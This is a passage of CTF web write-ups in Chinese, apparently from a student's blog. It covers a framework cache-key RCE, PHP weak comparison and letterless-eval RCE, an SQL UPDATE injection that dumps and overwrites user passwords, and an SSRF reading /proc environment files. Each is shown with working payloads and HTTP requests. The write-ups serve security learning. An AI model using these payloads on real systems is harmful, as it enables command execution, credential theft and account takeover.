<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620463.png" alt="image-20240711122320854"></p>
<p>全局搜索能看到上图所示位置，我们跟踪request_cache_key去向，如下图，这里判断cache变量是否为空，是空的话就调用getRequestCache函数</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620464.png" alt="image-20240711123154195"></p>
<p>这里根据config信息，进行赋值然后返回一个数组</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620465.png" alt="image-20240711123415010"></p>
<p>继续跟进，这里先是判断cache是否是数组，很明显上一步返回的就是数组，然后他会填充该数组，使得数组的长度一定是3，随后调用parseCacheKey函数，我们跟进</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620466.png" alt="image-20240711123600262"></p>
<pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseCacheKey</span>(<span class="hljs-params"><span class="hljs-variable">$request</span>, <span class="hljs-variable">$key</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Closure</span>) {
            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$request</span>);
        }

        <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$key</span>) {
            <span class="hljs-comment">// 关闭当前缓存</span>
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> === <span class="hljs-variable">$key</span>) {
            <span class="hljs-comment">// 自动缓存功能</span>
            <span class="hljs-variable">$key</span> = <span class="hljs-string">'__URL__'</span>;
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">'|'</span>)) {
            [<span class="hljs-variable">$key</span>, <span class="hljs-variable">$fun</span>] = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">'|'</span>, <span class="hljs-variable">$key</span>);
        }

        <span class="hljs-comment">// 特殊规则替换</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">'__'</span>)) {
            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>([<span class="hljs-string">'__CONTROLLER__'</span>, <span class="hljs-string">'__ACTION__'</span>, <span class="hljs-string">'__URL__'</span>], [<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">controller</span>(), <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">action</span>(), <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">url</span>(<span class="hljs-literal">true</span>))], <span class="hljs-variable">$key</span>);
        }

        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">':'</span>)) {
            <span class="hljs-variable">$param</span> = <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">param</span>();

            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span> =&gt; <span class="hljs-variable">$val</span>) {
                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$val</span>) &amp;&amp; <span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">':'</span> . <span class="hljs-variable">$item</span>)) {
                    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">':'</span> . <span class="hljs-variable">$item</span>, (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$val</span>, <span class="hljs-variable">$key</span>);
                }
            }
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">']'</span>)) {
            <span class="hljs-keyword">if</span> (<span class="hljs-string">'['</span> . <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">ext</span>() . <span class="hljs-string">']'</span> == <span class="hljs-variable">$key</span>) {
                <span class="hljs-comment">// 缓存某个后缀的请求</span>
                <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">url</span>());
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span>;
            }
        }

        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fun</span>)) {
            <span class="hljs-variable">$key</span> = <span class="hljs-variable">$fun</span>(<span class="hljs-variable">$key</span>);
        }

        <span class="hljs-keyword">return</span> <span class="hljs-variable">$key</span>;
    }
}</code></pre>
<p>可以看到上述会先对key参数做判断，由于key这里我们是可控的，因此我们可以让其进入到这段代码：</p>
<pre><code class="hljs php">} <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">'|'</span>)) {
            [<span class="hljs-variable">$key</span>, <span class="hljs-variable">$fun</span>] = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">'|'</span>, <span class="hljs-variable">$key</span>);
        }</code></pre>
<p>如果我们给key赋值为1|2类似形式，那就会进入上述代码，然后由|分割成为数组，然后继续判断最后来到这里</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fun</span>)) {
            <span class="hljs-variable">$key</span> = <span class="hljs-variable">$fun</span>(<span class="hljs-variable">$key</span>);
        }

        <span class="hljs-keyword">return</span> <span class="hljs-variable">$key</span>;</code></pre>
<p>简单判断fun是否存在，然后就调用fun函数，传入key值，很明显这里我们可以构造任意函数来执行命令</p>
<pre><code class="hljs scss">?s=index/index/&amp;isCache=cat /<span class="hljs-number">000</span>*|system&amp;cacheTime=-<span class="hljs-number">1</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620467.png" alt="image-20240711171743913"></p>
<h1 id="hubuctf-2022-新生赛">[HUBUCTF 2022 新生赛]</h1>
<h2 id="checkin">checkin</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$username</span>  = <span class="hljs-string">"this_is_secret"</span>; 
<span class="hljs-variable">$password</span>  = <span class="hljs-string">"this_is_not_known_to_you"</span>; 
<span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<span class="hljs-comment">//here I changed those two </span>
<span class="hljs-variable">$info</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'info'</span>])? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'info'</span>]: <span class="hljs-string">""</span> ;
<span class="hljs-variable">$data_unserialize</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$info</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">'username'</span>]==<span class="hljs-variable">$username</span>&amp;&amp;<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">'password'</span>]==<span class="hljs-variable">$password</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error!"</span>;

}

<span class="hljs-meta">?&gt;</span>
username <span class="hljs-keyword">or</span> password error!</code></pre>
<p>刚开始被骗了，满足上述条件出不来flag，看了评论知道，猜测题目给的就是假的，所以考的是弱比较，直接赋值为true即可</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$test</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"username"</span>=&gt;<span class="hljs-literal">true</span>, <span class="hljs-string">"password"</span>=&gt;<span class="hljs-literal">true</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);
<span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620469.png" alt="image-20240714154701028"></p>
<h2 id="howtogetshell">HowToGetShell</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$mess</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'mess'</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[a-zA-Z]/"</span>,<span class="hljs-variable">$mess</span>)){
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"invalid input!"</span>);
}
<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$mess</span>);</code></pre>
<p>知道就是无字母RCE</p>
<pre><code class="hljs scss">mess=$_=(~%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>C%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>D%<span class="hljs-number">8</span>B);$__=(~%A0%B8%BA%AB);$___=$$__;$<span class="hljs-built_in">_</span>($___[<span class="hljs-number">1</span>]);</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620470.png" alt="image-20240714161023741"></p>
<h2 id="calculate">Calculate</h2>
<p>计算题</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

url = <span class="hljs-string">'http://node5.anna.nssctf.cn:29251/'</span>
s = requests.Session()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">20</span>):
    res1 = s.get(url=url)

    soup = BeautifulSoup(res1.text,<span class="hljs-string">'html.parser'</span>)
    tags = soup.find_all(<span class="hljs-string">'div'</span>)

    cal = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> tags:
        <span class="hljs-comment">#print(tag.text)</span>
        cal += tag.text

    cal = cal[:-<span class="hljs-number">1</span>]
    num = <span class="hljs-built_in">eval</span>(cal)

    time.sleep(<span class="hljs-number">1</span>)
    res2 = s.post(url=url,data={<span class="hljs-string">"ans"</span>: <span class="hljs-string">f"<span class="hljs-subst">{num}</span>"</span>})
    <span class="hljs-built_in">print</span>(res2.text)</code></pre>
<h2 id="ezsql">ezsql</h2>
<p>首页发现存在注册和登录功能，知道有个admin用户但不知道密码。弱口令不行，尝试注册一个用户，注册之后发现可以更新自己的个人信息，抓包进一步测试</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620471.png" alt="image-20240714165119998"></p>
<p>同时目录扫描，得到源码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620472.png" alt="image-20240714165542221"></p>
<p>发现update.php中，箭头处存在update注入，其他的地方都用了?作为占位符，不能注入</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620473.png" alt="image-20240714165923052"></p>
<p>这里能知道，采用闭合思路，age不用单引号闭合，然后直接跟逗号，后面给description赋值即可，剩下的用注释符注释掉即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620474.png" alt="image-20240714170135414"></p>
<p>不过查询的结果需要跟随重定向才能看到</p>
<pre><code class="hljs scss">POST /update<span class="hljs-selector-class">.php</span> HTTP/<span class="hljs-number">1.1</span>
Host: node5.anna.nssctf.cn:<span class="hljs-number">22826</span>
Content-Length: <span class="hljs-number">98</span>
Cache-Control: max-age=<span class="hljs-number">0</span>
Upgrade-Insecure-Requests: <span class="hljs-number">1</span>
Origin: http://node5.anna.nssctf.cn:<span class="hljs-number">22826</span>
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">126.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span> Safari/<span class="hljs-number">537.36</span>
Accept: text/html,application/xhtml+xml,application/xml;<span class="hljs-selector-tag">q</span>=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
<span class="hljs-comment">Referer: http://node5.anna.nssctf.cn:22826/index.php</span>
<span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span>
<span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span>
<span class="hljs-comment">Cookie: PHPSESSID=j0q7264e5365c0o7vfiotfg1v0</span>
<span class="hljs-comment">Connection: close</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">nickname=asd&amp;age=23,description=(select group_concat(table_name)from information_schema.tables where table_schema=database())--+&amp;description=asd&amp;token=548bb4d1fef203db60b6e63044b286fd</span></code></pre>
<p>数据库名字为demo2</p>
<pre><code class="hljs scss">select <span class="hljs-built_in">group_concat</span>(table_name)from information_schema<span class="hljs-selector-class">.tables</span> where table_schema=<span class="hljs-built_in">database</span>()</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620475.png" alt="image-20240714170334814"></p>
<pre><code class="hljs scss">select <span class="hljs-built_in">group_concat</span>(column_name)from information_schema<span class="hljs-selector-class">.columns</span> where table_name=<span class="hljs-number">0</span>x7573657273</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620476.png" alt="image-20240714170458015"></p>
<pre><code class="hljs scss">select <span class="hljs-built_in">group_concat</span>(password)from users</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620477.png" alt="image-20240714170610486"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620478.png" alt="image-20240714170659065"></p>
<p>得到密码。当然也可以直接尝试修改密码</p>
<pre><code class="hljs scss">nickname=hhh&amp;age=<span class="hljs-number">23</span>, password=<span class="hljs-number">0</span>x3230326362393632616335393037356239363462303731353264323334623730</code></pre>
<h1 id="sdctf-2022">[SDCTF 2022]</h1>
<h2 id="apollo-1337">Apollo 1337</h2>
<p>这道题开始也算有思路，但是没找到关键，于是看了一眼wp，发现还是要仔细看看前端页面交互情况</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157044.png" alt="image-20240718153843341"></p>
<p>这里直接用插件看到了一个api接口，当然也可以F12查看网络模块。访问之后如下图所示</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157045.png" alt="image-20240718153922739"></p>
<p>然后尝试的给verbose参数传参，发现不论传什么数据，回显如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157046.png" alt="image-20240718154221582"></p>
<p>可以看到有三个路由，分别访问看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157047.png" alt="image-20240718154249444"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157048.png" alt="image-20240718154340164"></p>
<p>之后回到rocketlaunch路由，尝试切换为json类型，然后发现提示rocket变量未设置，那我们设置一下，如下图，提示我们应该赋值为triton</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157049.png" alt="image-20240718154649178"></p>
<p>之后发包提示没有设置launchTime变量，于是我继续添加，发现参数值格式为hh:mm，发送之后说我们的发送时间不对</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157050.png" alt="image-20240718155048805"></p>
<p>无法，看了wp发现这个平台的题目缺少题目描述：</p>
<pre><code class="hljs scss">Hey there intern! We have <span class="hljs-selector-tag">a</span> rocket launch scheduled for noon today and the launch
interface is down. You'll need to directly use the API to launch the rocket. No, we don't
have any documentation. And quickly, our shareholders are watching!</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157051.png" alt="image-20240718155129403"></p>
<p>这里提到是中午发射火箭，我们尝试12:00</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157052.png" alt="image-20240718155236644"></p>
<p>之后设置pumpID变量，传值的时候，当我们传的不对，会提示，测试之后发现4是可以的（这里也调用了fule的接口）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157053.png" alt="image-20240718155334526"></p>
<p>最后提示我们设置token，这里随便输入之后，提示我们token无效，接着我返回前端，翻找js是否含有token，果不其然找到了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157054.png" alt="image-20240718160038147"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157055.png" alt="image-20240718155953907"></p>
<h2 id="curl-up-and-read">CURL Up and Read</h2>
<p>首页一个http请求页面，输入正确url格式，然后请求目标网址内容，这里先尝试了请求127.0.0.1，显示内部错误</p>
<p>随后看了提示，尝试利用file伪协议，查看proc/1/environ环境变量，但是发现前端对格式做了限制，但同时发现格式被编码为了base64，接着如下图构造以下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157056.png" alt="image-20240718161709095"></p>
<p>随机拼接url路由，得到环境变量</p>
